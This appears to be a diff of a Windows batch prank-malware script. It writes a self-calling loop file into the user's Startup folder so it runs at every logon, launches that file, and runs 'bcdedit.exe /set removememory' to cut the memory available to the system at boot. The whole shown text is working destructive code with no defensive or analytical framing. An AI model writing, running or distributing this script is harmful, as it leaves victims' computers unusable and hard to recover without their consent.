@@ -17,10 +17,10 @@ echo Will be getting rid of %c% bytes of memory
 echo Starting copy...
 cd "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup"
 echo :funny > funny.bat
-echo funny.bat >> funny.bat
+echo call "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup/funny.bat" >> funny.bat
 echo goto:funny >> funny.bat
 echo Finished!
-start funny.bat
+call "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup/funny.bat"
 echo Running...
 
 bcdedit.exe /set removememory %c% 
